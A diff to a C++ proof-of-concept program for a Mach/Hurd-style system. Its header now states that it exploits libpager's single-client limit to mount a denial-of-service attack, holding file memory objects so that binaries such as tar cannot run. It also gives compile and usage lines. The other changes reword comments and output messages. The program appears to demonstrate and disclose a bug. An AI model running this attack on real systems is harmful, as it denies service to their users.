@@ -1,13 +1,26 @@
 /* -*- mode: C++; indent-tabs-mode: nil -*-
 
    grab-memory-objects - test program to grab and hold as many
-   memory-objects as possible
+   memory objects as possible on a collection of files
+
+   The intent is to exploit libpager's current support for only a
+   single client.  By grabbing a file's associated memory object, you
+   can mount a denial-of-service attack against the kernel, which
+   needs a memory object to mmap() the file for execution.
+
+   Nothing more than read access to the file is required.
+
+   Compile with:
+
+   g++ -std=c++11 -o grab-memory-objects grab-memory-objects.cc
 
    Basic operation:
 
    grab-memory-objects /bin/tar (or whatever)
 
-   If the grab is successful, good luck running tar, now or ever.
+   If the grab is successful, good luck running tar while this program
+   is running.  If you try to run tar, you'll never be able to run it
+   again, even if you termnate this program, without a reboot.
 */
 
 #include <iostream>
@@ -68,7 +81,7 @@ main(int argc, char *argv[])
 
   mach_call (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_PORT_SET, &portset));
 
-  /* 'objname' is a unused port that's passed to the memory object as an identifier */
+  /* 'objname' is a unused port that's passed to the memory manager as an identifier */
 
   mach_port_t objname;
 
@@ -96,7 +109,7 @@ main(int argc, char *argv[])
 
           /* If we got either kind of memory object (read or write),
            * create a control port, remember its association with the
-           * filename, and ship it off to the memory object in a
+           * filename, and send it to the memory manager in a
            * memory_object_init message.  We're hoping to receive back
            * a memory_object_ready message.
            */
@@ -184,21 +197,21 @@ main(int argc, char *argv[])
 
   if (! read_locks.empty())
     {
-      std::cout << "Read locks obtained: " << read_locks << std::endl;
+      std::cout << "Read objects obtained: " << read_locks << std::endl;
     }
 
   if (! write_locks.empty())
     {
-      std::cout << "Write locks obtained: " << write_locks << std::endl;
+      std::cout << "Write objects obtained: " << write_locks << std::endl;
     }
 
   if ((! read_locks.empty()) || (! write_locks.empty()))
     {
-      std::cout << "Holding locks and waiting for CNTL-C" << std::endl;
+      std::cout << "Holding memory objects and waiting for CNTL-C" << std::endl;
       pause();
     }
   else
     {
-      std::cout << "No locks obtained (sorry)" << std::endl;
+      std::cout << "No memory objects obtained (sorry)" << std::endl;
     }
 }
